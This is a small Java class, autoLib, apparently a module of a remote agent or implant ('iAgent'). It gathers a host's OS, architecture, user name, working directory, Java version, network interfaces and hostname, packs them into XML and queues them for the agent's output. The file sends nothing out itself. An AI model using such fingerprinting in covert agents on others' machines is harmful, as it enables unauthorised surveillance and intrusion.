package com.nocebo.nCore;

import java.net.SocketException;
import java.net.UnknownHostException;
import java.text.SimpleDateFormat;
import java.util.Hashtable;

import javax.xml.parsers.ParserConfigurationException;
import javax.xml.transform.TransformerException;

import org.w3c.dom.Document;

public class autoLib
{
    public void metadata(String[] args) throws SocketException, UnknownHostException, ParserConfigurationException, TransformerException
    {
        Hashtable<String,String> metadata = new Hashtable<>();
        iAgent.utilitarian nUtil = new iAgent.utilitarian();
                
        metadata.put("arch",System.getProperty("os.arch"));
        metadata.put("os",System.getProperty("os.name"));
        metadata.put("version",System.getProperty("os.version"));
        metadata.put("user",System.getProperty("user.name"));
        metadata.put("cwd",System.getProperty("user.dir"));
        metadata.put("jre",System.getProperty("java.runtime.version"));
        metadata.put("interfaces",nUtil.getAddress().toString());
        metadata.put("hostname",nUtil.getHostname());
        metadata.put("uuid",iAgent.sessUUID);
        metadata.put("timestamp",new SimpleDateFormat("yyyy.MM.dd.HH.mm.ss").format(new java.util.Date()));
        metadata.put("error","");

        Document metaDoc = nUtil.outputToXmlDoc("metadata",metadata);
        iAgent.output.add(metaDoc);
    }
}